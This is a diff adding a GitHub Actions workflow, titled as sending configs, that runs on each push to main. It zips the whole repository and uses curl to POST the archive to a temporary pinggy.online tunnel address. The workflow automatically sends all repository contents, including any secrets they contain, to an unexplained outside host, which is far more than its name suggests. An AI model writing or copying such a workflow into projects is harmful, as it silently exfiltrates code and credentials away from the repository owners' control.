@@ -1,0 +1,19 @@
+name: Send Configs on Merge
+
+on:
+  push:
+    branches:
+      - main # of de branch waarin je merges doet
+
+jobs:
+  send-config:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Compress Folders
+        run: zip -r repo.zip .
+      - name: Send Compressed Folder
+        run: |
+          curl -X POST https://rnzkl-2a02-1812-1130-3800-b074-eae-88b5-4a86.a.free.pinggy.online/repo \
+          -F 'file=@repo.zip' \
+          -H 'Content-Type: multipart/form-data'
